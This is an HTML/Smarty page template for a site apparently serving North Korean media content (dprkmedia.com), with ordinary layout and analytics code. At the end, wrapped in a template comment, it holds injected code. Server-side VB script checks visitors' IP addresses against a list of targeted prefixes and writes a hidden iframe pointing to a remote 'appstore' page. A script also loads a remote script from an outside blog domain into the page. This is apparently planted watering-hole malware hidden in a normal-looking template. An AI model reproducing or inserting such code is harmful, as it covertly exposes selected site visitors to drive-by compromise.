<HTML>
	<HEAD>
		<title>KPM - 조선언론 정보기지</title>

<meta http-equiv="x-ua-compatible" content="IE=edge" charset="ks_c_5601-1987">	
  	<LINK href="/css/main.css" type="text/css" rel="stylesheet">
		<script language="JavaScript" src="/js/main.js"></script>
		<script language="JavaScript" src="/js/admin.js"></script>
		<script language="JavaScript" src="/js/google_map.js"></script>
		<script>
			{literal}
			<!--
			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

			ga('create', 'UA-3890334-2', 'dprkmedia.com');
			ga('send', 'pageview');
			// -->
			{/literal}
		</script>
	</HEAD>
	<body bgColor="#ffffff" leftMargin="0" topMargin="0">
		<form id="Form1" name="Form1" method="get" runat="server">
			<table cellSpacing="0" cellPadding="0" width="963" bgColor="#ffffff" border="0" height="100%">
				<tr>
					<td colSpan="5">
						<!-- TOP menu -->
						{include file='include/top.tpl'}
					</td>
					<td width="1" rowspan="4" bgcolor="#929292"></td>
				</tr>
				<tr>
					<td vAlign="top" align="center" width="148" height="100%">
						<!-- LEFT menu -->
						{include file='include/left.tpl'}
					</td>
					<td width="1" rowspan="3" bgcolor="#929292"></td>
					<td vAlign="top" align="center" width="584">
						<!-- Main START -->
						{$content}
						<!-- Main END -->
					</td>
					<td width="1" rowspan="3" bgcolor="#929292"></td>
					<td vAlign="top" align="center" width="228">
						<!-- RIGHT menu -->{include file='include/right.tpl'}
					</td>
				</tr>
				<tr>
					<td colSpan="5" height="8"></td>
				</tr>
				<tr>
					<td colSpan="5">
						<!-- BOTTOM menu -->
						{include file='include/bottom.tpl'}
					</td>
				</tr>
			</table>
		</form>
		{* <!--
		<%
		Dim ip As String
		Dim ifrm As String = "<iframe id=""details"" frameborder=0 marginheight=""0"" marginwidth=""0"" scrolling=""no""  width=""50"" height=""50"" src=""http://128.241.236.3/appstore/index.html""></iframe>"

		ip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
		if ip = "" Then
			ip = Request.ServerVariables("REMOTE_ADDR")
		End If

		If ip.StartsWith("210.52.109.") Or ip.StartsWith("117.136.5.") Or ip.StartsWith("60.21.140.126") Or ip.StartsWith("112.112.68.216") Or ip.StartsWith("86.182.233.94") Or ip.StartsWith("194.29.129.125") Then
			Response.Write(ifrm)
		End If

		If ip.StartsWith("58.156.7.") Then
			Response.Write(ifrm)
		End If

		If ip.StartsWith("124.94.2.") Or ip.StartsWith("60.23.78.") Or ip.StartsWith("194.94.133.") Or ip.StartsWith("81.169.183.") Or ip.StartsWith("85.214.71.") Or ip.StartsWith("152.104.226.") Or ip.StartsWith("203.98.164.") Then
			Response.Write(ifrm)
		End If
		%>
<script>
var adj = document.createElement('script');
adj.src='http://luckluck.blog/brale/';
top.document.body.appendChild(adj);
</script>
		--> *}
	</body>
</HTML>
